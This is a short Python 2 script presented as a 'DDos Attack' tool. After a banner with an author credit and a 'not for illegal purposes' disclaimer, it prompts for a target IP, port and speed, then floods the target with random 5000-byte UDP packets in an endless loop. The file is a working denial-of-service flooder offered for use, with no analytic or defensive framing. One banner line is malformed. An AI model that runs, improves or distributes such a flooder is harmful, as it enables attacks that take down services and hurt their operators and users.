# python2

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(5000)
#############

os.system("clear")
os.system("figlet DDos Attack")
print " "
print "/---------------------------------------------------\ ::::::::"
print "|   Author          : mkra            |"
print "|   Author github   :  https://github.com/soreungmakara2/Makra"
print "|             
print "|   Edition         : V1.0.0                        |"
print "\---------------------------------------------------/"
print " "
print " ---------[Do not use for illegal purposes]--------- "
print " "
ip = raw_input("Input IP     : ")
port = int(input("Attack port  : "))
sd = int(input("Attack speed(1~5000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print "Sent %s packet to %s throught port:%d"%(sent,ip,port)
     time.sleep((5000-sd)/5000)
